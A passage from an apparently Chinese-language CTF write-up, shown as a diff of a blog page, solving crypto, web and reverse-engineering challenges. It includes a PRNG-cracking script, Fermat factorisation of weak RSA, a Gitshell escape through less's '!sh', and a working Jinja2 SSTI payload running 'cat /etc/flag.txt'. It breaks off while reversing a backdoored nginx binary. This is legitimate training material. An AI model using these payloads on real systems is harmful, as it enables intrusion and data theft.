+    <span class="c1"># 爆破 PoW</span>
+    <span class="n">pow_sol</span> <span class="o">=</span> <span class="n">solve_pow</span><span class="p">(</span><span class="n">prefix</span><span class="p">,</span> <span class="n">target_hash</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">pow_sol</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">"PoW failed"</span><span class="p">)</span>
+        <span class="k">return</span>
+    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"PoW solution: </span><span class="si">{</span><span class="n">pow_sol</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">'&gt;'</span><span class="p">,</span> <span class="n">pow_sol</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+
+    <span class="c1"># 进入主循环</span>
+    <span class="n">rc</span> <span class="o">=</span> <span class="n">RandCrack</span><span class="p">()</span>
+
+    <span class="c1"># 第一阶段：收集前10个随机数</span>
+    <span class="n">first_10_cards</span> <span class="o">=</span> <span class="p">[]</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">10</span><span class="p">):</span>
+        <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">'&gt;'</span><span class="p">,</span> <span class="sa">b</span><span class="s1">'H'</span><span class="p">)</span>
+        <span class="c1"># 猜错（输入 0 ）</span>
+        <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">'check&gt;'</span><span class="p">,</span> <span class="sa">b</span><span class="s1">'0'</span><span class="p">)</span>
+        <span class="n">resp</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+        <span class="k">if</span> <span class="sa">b</span><span class="s1">'Negative'</span> <span class="ow">in</span> <span class="n">resp</span><span class="p">:</span>
+            <span class="n">line</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+            <span class="c1"># 解析 card = 12345678</span>
+            <span class="n">card_val</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">line</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">'='</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">strip</span><span class="p">())</span>
+            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"[</span><span class="si">{</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="si">}</span><span class="s2">] card = </span><span class="si">{</span><span class="n">card_val</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>
+            <span class="n">first_10_cards</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">card_val</span><span class="p">)</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="c1"># 前十次都有猜对的，你应该去买彩票，你不准做题了</span>
+            <span class="k">return</span>
+
+    <span class="c1"># r 重置</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">'&gt;'</span><span class="p">,</span> <span class="sa">b</span><span class="s1">'R'</span><span class="p">)</span>
+
+    <span class="c1"># 第二阶段：重新收集624个随机数，前10次用已知的正确值猜测</span>
+    <span class="n">score</span> <span class="o">=</span> <span class="mi">610</span> <span class="o">*</span> <span class="mi">2</span>  <span class="c1"># 初始分数</span>
+
+    <span class="c1"># 前10次使用已知的正确值</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">10</span><span class="p">):</span>
+        <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">'&gt;'</span><span class="p">,</span> <span class="sa">b</span><span class="s1">'H'</span><span class="p">)</span>
+        <span class="c1"># 使用之前收集到的正确低16位</span>
+        <span class="n">correct_low16</span> <span class="o">=</span> <span class="n">first_10_cards</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0xFFFF</span>
+        <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">'check&gt;'</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">correct_low16</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+        <span class="n">resp</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+        <span class="k">if</span> <span class="sa">b</span><span class="s1">'Positive'</span> <span class="ow">in</span> <span class="n">resp</span><span class="p">:</span>
+            <span class="n">score</span> <span class="o">+=</span> <span class="mi">1</span>
+            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"[</span><span class="si">{</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="si">}</span><span class="s2">] Correct guess! Score: </span><span class="si">{</span><span class="n">score</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>
+            <span class="c1"># 提交给 RandCrack（32 位）</span>
+            <span class="n">rc</span><span class="o">.</span><span class="n">submit</span><span class="p">(</span><span class="n">first_10_cards</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFFF</span><span class="p">)</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="c1"># 网速较差/时间窗口没卡好</span>
+            <span class="n">score</span> <span class="o">-=</span> <span class="mi">2</span>
+            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"[</span><span class="si">{</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="si">}</span><span class="s2">] Unexpected Negative!"</span><span class="p">)</span>
+            <span class="k">return</span>
+
+    <span class="c1"># 继续收集剩余的614个随机数</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">10</span><span class="p">,</span> <span class="mi">624</span><span class="p">):</span>
+        <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">'&gt;'</span><span class="p">,</span> <span class="sa">b</span><span class="s1">'H'</span><span class="p">)</span>
+        <span class="c1"># 猜错（输入 0）</span>
+        <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">'check&gt;'</span><span class="p">,</span> <span class="sa">b</span><span class="s1">'0'</span><span class="p">)</span>
+        <span class="n">resp</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+        <span class="k">if</span> <span class="sa">b</span><span class="s1">'Negative'</span> <span class="ow">in</span> <span class="n">resp</span><span class="p">:</span>
+            <span class="n">score</span> <span class="o">-=</span> <span class="mi">2</span>
+            <span class="n">line</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+            <span class="c1"># 解析 card = xxxxxxxx</span>
+            <span class="n">card_val</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">line</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">'='</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">strip</span><span class="p">())</span>
+            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"[</span><span class="si">{</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="si">}</span><span class="s2">] card = </span><span class="si">{</span><span class="n">card_val</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>
+            <span class="c1"># 提交给 RandCrack（32 位）</span>
+            <span class="n">rc</span><span class="o">.</span><span class="n">submit</span><span class="p">(</span><span class="n">card_val</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFFF</span><span class="p">)</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="c1"># 你知道我要说什么</span>
+            <span class="k">return</span>
+
+    <span class="c1"># 第三阶段：全部猜对直到分数足够</span>
+    <span class="k">while</span> <span class="n">score</span> <span class="o">&lt;</span> <span class="mi">9999</span><span class="p">:</span>
+        <span class="c1"># 预测下一个随机数</span>
+        <span class="n">predicted</span> <span class="o">=</span> <span class="n">rc</span><span class="o">.</span><span class="n">predict_getrandbits</span><span class="p">(</span><span class="mi">32</span><span class="p">)</span>
+        <span class="n">low16</span> <span class="o">=</span> <span class="n">predicted</span> <span class="o">&amp;</span> <span class="mh">0xFFFF</span>
+
+        <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">'&gt;'</span><span class="p">,</span> <span class="sa">b</span><span class="s1">'H'</span><span class="p">)</span>
+        <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">'check&gt;'</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">low16</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+        <span class="n">resp</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+        <span class="k">if</span> <span class="sa">b</span><span class="s1">'Positive'</span> <span class="ow">in</span> <span class="n">resp</span><span class="p">:</span>
+            <span class="n">score</span> <span class="o">+=</span> <span class="mi">1</span>
+            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"Score: </span><span class="si">{</span><span class="n">score</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="n">score</span> <span class="o">-=</span> <span class="mi">2</span>
+            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"Wrong prediction! Score: </span><span class="si">{</span><span class="n">score</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>
+            <span class="c1"># 应该不会出错</span>
+            <span class="k">if</span> <span class="n">score</span> <span class="o">&lt;=</span> <span class="mi">0</span><span class="p">:</span>
+                <span class="nb">print</span><span class="p">(</span><span class="s2">"Score &lt;= 0, failed"</span><span class="p">)</span>
+                <span class="k">return</span>
+
+    <span class="c1"># 分数达到 9999，Stand</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">'&gt;'</span><span class="p">,</span> <span class="sa">b</span><span class="s1">'S'</span><span class="p">)</span>
+    <span class="n">Flag</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+    <span class="nb">print</span><span class="p">(</span><span class="n">Flag</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">'__main__'</span><span class="p">:</span>
+    <span class="n">main</span><span class="p">()</span>
+</code></pre></div></td></tr></tbody></table></div>
+<p>跑一遍程序即可拿到 Flag: <code>flag{303191d0-227d-440d-8cf6-7a45f378757e}</code> </p>
+<p>（个人建议把 600s 时限放宽一点，我一开始连接的校内 VPN 在得到两千多分的时候就超时退出了😡）</p>
+<h3 id="crypto05-ezrsa">Crypto05-EZRSA</h3>
+<p>提供了一个 Python 文件，<del>翻代码发现 flag = b"flag{GUESS_ME_DUDE???}"，结束本题</del></p>
+<p>末尾注释提供了一些 RSA 相关的数据：</p>
+<div class="highlight"><table class="highlighttable"><tbody><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span>
+<span class="normal">3</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="n">n</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1761136274297027039963230651989531722606611852591964400481006338727378865369012452786479495394114231817718239</span>
+<span class="n">e</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">65537</span>
+<span class="n">c</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1230891216923086590416832066481981391436300928059089913296665775664238914246508186217218568669712406212992089</span>
+</code></pre></div></td></tr></tbody></table></div>
+<p>我们需要拆解 <code>n</code> 这个大数（<code>n = p * q</code>），而不幸的是 factordb 拆不开这个数，注意到提供的代码中有这样的生成操作</p>
+<div class="highlight"><table class="highlighttable"><tbody><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span>
+<span class="normal">14</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="n">p_bits</span> <span class="o">=</span> <span class="mi">180</span>                                        <span class="c1"># p 是 180 位的数字</span>
+<span class="n">close_offset_max</span> <span class="o">=</span> <span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">20</span>
+
+<span class="n">low</span> <span class="o">=</span> <span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="p">(</span><span class="n">p_bits</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span>
+<span class="n">high</span> <span class="o">=</span> <span class="p">(</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="n">p_bits</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span>
+
+<span class="n">a</span> <span class="o">=</span> <span class="n">random</span><span class="o">.</span><span class="n">randrange</span><span class="p">(</span><span class="n">low</span><span class="p">,</span> <span class="n">high</span><span class="p">)</span>                     
+<span class="n">p</span> <span class="o">=</span> <span class="n">next_prime</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>                                   <span class="c1"># 生成 180 位的随机素数 p</span>
+<span class="n">offset</span> <span class="o">=</span> <span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">1000</span><span class="p">,</span> <span class="n">close_offset_max</span><span class="p">)</span>     <span class="c1"># 生成一个偏移量，在 1000 ~ 2^20 之间</span>
+<span class="n">q</span> <span class="o">=</span> <span class="n">next_prime</span><span class="p">(</span><span class="n">p</span> <span class="o">+</span> <span class="n">offset</span><span class="p">)</span>                          <span class="c1"># p 加上偏移量后调整生成素数 q</span>
+<span class="k">if</span> <span class="n">p</span> <span class="o">==</span> <span class="n">q</span><span class="p">:</span>
+    <span class="k">continue</span>
+
+<span class="n">n</span> <span class="o">=</span> <span class="n">p</span> <span class="o">*</span> <span class="n">q</span>
+</code></pre></div></td></tr></tbody></table></div>
+<p>也就是说 <code>p,q</code> 的位数大致固定，且 <code>q - p</code> 差值比较小，考虑使用 Fermat 质数分解算法：</p>
+<div class="highlight"><table class="highlighttable"><tbody><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="k">def</span><span class="w"> </span><span class="nf">fermat_factorization</span><span class="p">(</span><span class="n">n</span><span class="p">):</span>
+    <span class="n">a</span> <span class="o">=</span> <span class="n">gmpy2</span><span class="o">.</span><span class="n">isqrt</span><span class="p">(</span><span class="n">n</span><span class="p">)</span>
+    <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+        <span class="n">b2</span> <span class="o">=</span> <span class="n">a</span> <span class="o">*</span> <span class="n">a</span> <span class="o">-</span> <span class="n">n</span>
+        <span class="k">if</span> <span class="n">gmpy2</span><span class="o">.</span><span class="n">is_square</span><span class="p">(</span><span class="n">b2</span><span class="p">):</span>
+            <span class="n">b</span> <span class="o">=</span> <span class="n">gmpy2</span><span class="o">.</span><span class="n">isqrt</span><span class="p">(</span><span class="n">b2</span><span class="p">)</span>
+            <span class="n">p</span> <span class="o">=</span> <span class="n">a</span> <span class="o">-</span> <span class="n">b</span>
+            <span class="n">q</span> <span class="o">=</span> <span class="n">a</span> <span class="o">+</span> <span class="n">b</span>
+            <span class="k">return</span> <span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="p">),</span> <span class="nb">int</span><span class="p">(</span><span class="n">q</span><span class="p">)</span>
+        <span class="n">a</span> <span class="o">+=</span> <span class="mi">1</span>
+</code></pre></div></td></tr></tbody></table></div>
+<p>带入到具体数据跑一遍程序就可以拿到 Flag：<code>flag{RSA_is_weak_when_p_approx_q}</code>，Flag 说得对</p>
+<hr>
+<h2 id="pwn">💥 PWN</h2>
+<p>PWN 题我都不会写，对不起出题者😭</p>
+<p>(Update: 网络攻防实战课程学到了 PWN，应该不至于一点不会了)</p>
+<hr>
+<h2 id="web">🕸️ WEB</h2>
+<h3 id="web01-">Web01-逃离</h3>
+<blockquote>
+<p>在一次渗透测试中，你通过一个文件读取漏洞得到了用户名 git 的 SSH 私钥
+使用给定的 SSH 私钥和用户名 git 登录指定的地址，从 Gitshell 里逃离</p>
+<p>flag 在 /home/git 下</p>
+</blockquote>
+<p>目标是从高度受限的 Gitshell 环境中想办法来到普通 Shell 环境中，读取 <code>/home/git</code> 的内容</p>
+<p>先用 SSH 试探一下（<code>id_rsa</code> 是下发的私钥文件）：</p>
+<div class="highlight"><table class="highlighttable"><tbody><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span>
+<span class="normal">3</span></pre></div></td><td class="code"><div><pre><span></span><code>&gt;<span class="w"> </span>ssh<span class="w"> </span>-i<span class="w"> </span>id_rsa<span class="w"> </span>git@xxx.xxx.xxx.xx<span class="w"> </span>-p<span class="w"> </span><span class="m">12345</span>
+fatal:<span class="w"> </span>unrecognized<span class="w"> </span><span class="nb">command</span><span class="w"> </span><span class="s1">''</span>
+Connection<span class="w"> </span>to<span class="w"> </span>xxx.xxx.xxx.xx<span class="w"> </span>closed.
+</code></pre></div></td></tr></tbody></table></div>
+<p>坏透了，这个 Git 服务器不允许交互式输入指令，我只能在 SSH 请求时附带我的指令：</p>
+<div class="highlight"><table class="highlighttable"><tbody><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span></pre></div></td><td class="code"><div><pre><span></span><code>&gt;<span class="w"> </span>ssh<span class="w"> </span>-i<span class="w"> </span>id_rsa<span class="w"> </span>git@xxx.xxx.xxx.xx<span class="w"> </span>-p<span class="w"> </span><span class="m">12345</span><span class="w"> </span><span class="s2">"help"</span>
+fatal:<span class="w"> </span>unrecognized<span class="w"> </span><span class="nb">command</span><span class="w"> </span><span class="s1">'help'</span>
+</code></pre></div></td></tr></tbody></table></div>
+<p><code>help</code> 都不能用？经过测试和查询，只有 <code>git receive-pack</code> <code>git upload-pack</code> <code>git upload-archive</code> 可以使用，那就找个仓库上传些什么东西做个手脚：</p>
+<div class="highlight"><table class="highlighttable"><tbody><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span></pre></div></td><td class="code"><div><pre><span></span><code>&gt;<span class="w"> </span>ssh<span class="w"> </span>-i<span class="w"> </span>id_rsa<span class="w"> </span>git@xxx.xxx.xxx.xx<span class="w"> </span>-p<span class="w"> </span><span class="m">12345</span><span class="w"> </span><span class="s2">"git upload-pack '/home/git'"</span>
+fatal:<span class="w"> </span><span class="s1">'/home/git'</span><span class="w"> </span>does<span class="w"> </span>not<span class="w"> </span>appear<span class="w"> </span>to<span class="w"> </span>be<span class="w"> </span>a<span class="w"> </span>git<span class="w"> </span>repository
+</code></pre></div></td></tr></tbody></table></div>
+<p>又经过测试，这个环境里面没有 git 仓库（至少我没找到），我决定 <code>--help</code> 一下</p>
+<div class="highlight"><table class="highlighttable"><tbody><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span>
+<span class="normal">14</span>
+<span class="normal">15</span>
+<span class="normal">16</span>
+<span class="normal">17</span>
+<span class="normal">18</span>
+<span class="normal">19</span>
+<span class="normal">20</span>
+<span class="normal">21</span></pre></div></td><td class="code"><div><pre><span></span><code>&gt;<span class="w"> </span>ssh<span class="w"> </span>-i<span class="w"> </span>id_rsa<span class="w"> </span>git@xxx.xxx.xxx.xx<span class="w"> </span>-p<span class="w"> </span><span class="m">12345</span><span class="w"> </span><span class="s2">"git upload-pack '--help'"</span>
+GIT-UPLOAD-PACK<span class="o">(</span><span class="m">1</span><span class="o">)</span><span class="w">                </span>Git<span class="w"> </span>Manual<span class="w">                </span>GIT-UPLOAD-PACK<span class="o">(</span><span class="m">1</span><span class="o">)</span>
+
+NAME
+<span class="w">       </span>git-upload-pack<span class="w"> </span>-<span class="w"> </span>Send<span class="w"> </span>objects<span class="w"> </span>packed<span class="w"> </span>back<span class="w"> </span>to<span class="w"> </span>git-fetch-pack
+
+SYNOPSIS
+<span class="w">       </span>git-upload-pack<span class="w"> </span><span class="o">[</span>--<span class="o">[</span>no-<span class="o">]</span>strict<span class="o">]</span><span class="w"> </span><span class="o">[</span>--timeout<span class="o">=</span>&lt;n&gt;<span class="o">]</span><span class="w"> </span><span class="o">[</span>--stateless-rpc<span class="o">]</span>
+<span class="w">                         </span><span class="o">[</span>--advertise-refs<span class="o">]</span><span class="w"> </span>&lt;directory&gt;
+<span class="w">       </span>DESCRIPTION
+
+<span class="w">       </span><span class="c1"># ... 太多了不贴了</span>
+
+SEE<span class="w"> </span>ALSO
+<span class="w">       </span>gitnamespaces<span class="o">(</span><span class="m">7</span><span class="o">)</span>
+
+GIT
+<span class="w">       </span>Part<span class="w"> </span>of<span class="w"> </span>the<span class="w"> </span>git<span class="o">(</span><span class="m">1</span><span class="o">)</span><span class="w"> </span>suite
+
+Git<span class="w"> </span><span class="m">2</span>.12.2<span class="w">                        </span><span class="m">12</span>/25/2020<span class="w">                </span>GIT-UPLOAD-PACK<span class="o">(</span><span class="m">1</span><span class="o">)</span>
+&gt;<span class="w"> </span><span class="c1"># 直接退出 SSH 连接了</span>
+</code></pre></div></td></tr></tbody></table></div>
+<p><del>这是我目前成功运行的唯一一条指令</del>，输出页面让我想到了 <code>man</code> 指令，印象里帮助页面应该用 <code>less</code> 分页器打开，而 <code>less</code> 分页器 有 <code>!sh</code> 的操作可以打开子 <code>shell</code> 实现逃逸。查询得知需要在 SSH 连接时加上 <code>-t</code> 参数强制分配伪终端：</p>
+<div class="highlight"><table class="highlighttable"><tbody><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span>
+<span class="normal">3</span>
+<span class="normal">4</span></pre></div></td><td class="code"><div><pre><span></span><code>&gt;<span class="w"> </span>ssh<span class="w"> </span>-t<span class="w"> </span>-i<span class="w"> </span>id_rsa<span class="w"> </span>git@xxx.xxx.xxx.xx<span class="w"> </span>-p<span class="w"> </span><span class="m">12345</span><span class="w"> </span><span class="s2">"git upload-pack '--help'"</span>
+<span class="c1"># 用 less 打开了帮助文档，输入 !sh 进入子 shell</span>
+$<span class="w"> </span>cat<span class="w"> </span>/home/git/flag.txt
+Trinity<span class="o">{</span>GIT_5HE11_byp@ss_OOOOO_060524592cce19c7<span class="o">}</span>$
+</code></pre></div></td></tr></tbody></table></div>
+<p>获得了 Flag <code>Trinity{GIT_5HE11_byp@ss_OOOOO_060524592cce19c7}</code></p>
+<p><strong>Web02-逻辑鬼才</strong> 没有进展，不懂 HTTPDigestAuth :(</p>
+<h3 id="web03-hello-flask">Web03-Hello Flask!</h3>
+<blockquote>
+<p>我学会的第一行代码就是<code>cout&lt;&lt;"Hello Flask!"&lt;&lt;endl;</code></p>
+<p>flag 在 /etc/flag.txt</p>
+<p>访问：<code>http://ip:port/?name=123</code></p>
+</blockquote>
+<p>先按照他说的访问一下 <code>http://ip:port/?name=123</code>，HTML 页面只有一句 <em>Hello 123</em></p>
+<p>STFW 了解到 Flask 是 Python 的 Web 框架，使用 Jinja 模板引擎，又不小心搜到了 <a href="https://hello-ctf.com/hc-web/ssti/">SSTI注入 - Hello CTF</a> 了解了一下</p>
+<blockquote>
+<p><em>一般我们会在疑似的地方尝试插入简单的模板表达式，如 <code>{{7*7}}</code> <code>{{config}}</code>，看看是否能在页面上显示预期结果，以此确定是否有注入点。</em></p>
+</blockquote>
+<p>插入一下试试： <code>http://ip:port/?name={{7*7}}</code>，HTML 页面输出 <em>Hello 49</em>，看来有注入点</p>
+<p>经过和 AI 的反复修改后得到了下面的模板：</p>
+<div class="highlight"><table class="highlighttable"><tbody><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="p">{{</span><span class="n">cycler</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="o">.</span><span class="n">__builtins__</span><span class="o">.</span><span class="n">__import__</span><span class="p">(</span><span class="s1">'os'</span><span class="p">)</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s1">'cat /etc/flag.txt'</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()}}</span>
+<span class="c1"># 从 cycler 对象开始（Jinja2模板的默认对象），通过 __init__ 获取初始化方法， __globals__ 获取全局命名空间， __builtins__ 获取内置函数， __import__('os') 导入os模块，最终调用 popen() 执行系统命令，read() 进行读取，输出在 HTML 页面上</span>
+</code></pre></div></td></tr></tbody></table></div>
+<p>得到 Flag <code>Trinity{ssti_is_Funnnnnny!422144319e480db2}</code></p>
+<hr>
+<h2 id="re">🔍 RE</h2>
+<h3 id="re01-nginx">RE01-带后门的nginx</h3>
+<blockquote>
+<p><strong>描述：</strong> xx大学近日遭受一起 APT 攻击：黑客组织通过购买搜索引擎推广，将其精心伪造的 nginx 官网置于搜索结果首位。某运维人员因而下载了该网站上被植入后门的 nginx。服务上线后，黑客组织通过该后门长期隐蔽地从内网盗取信息。你的任务是通过逆向工程找到该后门的访问方式，并复现该后门来读取服务后台的 flag。</p>
+<p>该后门为命令执行后门，并被符合要求的 HTTP 请求触发。找到触发方式后，你可以构造任意命令。</p>
+<p>读取 flag 可以使用反弹 shell，也可以把 flag 文件拷贝到网站根目录。其中 flag 位于 /flag，nginx 网站位于 /nginx/html。</p>
+</blockquote>
+<p>下发了一个 <code>nginx</code> 文件，使用 DIE 检测为 <code>ELF64</code> ，使用 Ghidra 进行逆向，分析逆向内容。</p>
+<p>因为我不熟悉 nginx 反编译后的内容，偶然搜索了一下含 "flag" 的字符串</p>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="../../images/image-20251006183255254.png" data-desc-position="bottom"><img alt="image-20251006183255254" src="../../images/image-20251006183255254.png"></a></p>
+<p>找到了这个有趣的内容：</p>
+<div class="highlight"><table class="highlighttable"><tbody><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span>
+<span class="normal">3</span>
+<span class="normal">4</span>
+<span class="normal">5</span>
+<span class="normal">6</span></pre></div></td><td class="code"><div><pre><span></span><code>                             s_This_is_a_fake_flag!_001b8f5c                 XREF[3]:     ngx_http_static_handler:0018a078
+                                                                                         ngx_http_static_handler:0018a087
+                                                                                          001dd540 (*)   
+        001b8f5c 54  68  69       ds         "This_is_a_fake_flag!"
+                 73  5f  69 
+                 73  5f  61 
+</code></pre></div></td></tr></tbody></table></div>
+<p>我相信假 flag 不可能一点用都没有，于是定位到调用了这部分字符串的函数 <code>ngx_http_static_handler</code>，下面截取了有用的内容：</p>
+<div class="highlight"><table class="highlighttable"><tbody><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span>
+<span class="normal">14</span>
+<span class="normal">15</span>
+<span class="normal">16</span>
+<span class="normal">17</span>
+<span class="normal">18</span>
+<span class="normal">19</span>
+<span class="normal">20</span>
+<span class="normal">21</span>
+<span class="normal">22</span>
+<span class="normal">23</span>
+<span class="normal">24</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="n">__s</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">g_flag</span><span class="p">;</span><span class="w">   </span><span class="c1">// g_flag 的内容就是 "This_is_a_fake_flag!"</span>
+
+<span class="c1">// 将 password 硬编码为神秘值，然后与 g_flag 进行异或运算（解密）得到新的 password</span>
